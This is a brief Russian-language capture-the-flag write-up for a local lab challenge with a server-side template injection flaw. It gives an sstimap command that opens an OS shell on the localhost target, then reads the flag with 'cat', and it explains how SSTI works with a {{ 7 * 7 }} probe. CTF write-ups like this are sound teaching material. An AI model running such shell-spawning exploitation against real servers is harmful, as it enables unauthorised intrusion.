На сайте реализована SSTI уязвимость. Решить можно легко через sstimap с помощью команды:

python sstimap.py -u "http://localhost:5000/custom_report" --data "template=test" --os-shell

Выполненная команда сама организует консоль до сервера, флаг останется забрать только командой:

```
cat flag.txt
```

Server-Side Template Injection (SSTI) — это уязвимость в веб-приложении, возникающая из-за небезопасной обработки шаблонов на стороне сервера. SSTI позволяет злоумышленнику вставить вредоносный код в шаблон, который затем выполняется сервером.

### Как работает SSTI
1. Уязвимый шаблон: Веб-приложения, которые используют системы шаблонов (например, Jinja2, Twig, или Smarty), часто позволяют динамически генерировать HTML.
2. Эксплуатация: Если ввод пользователя включается в шаблон без надлежащей валидации, злоумышленники могут инжектировать произвольный код.
3. Исполнение: Сервер обрабатывает шаблон и выполняет включенный код.
4. Последствия: Это может привести к утечке данных, перехвату пользовательских сессий или даже удаленному выполнению кода на сервере.

### Пример
Если веб-приложение позволяет пользователю вводить имя, которое будет отображено в шаблоне, и затем выполняет что-то вроде:
Hello, {{ userName }}!

Злоумышленник может ввести что-то вроде:
{{ 7 * 7 }}

Если сервер недостаточно защищен, он выполнит код и покажет 49.
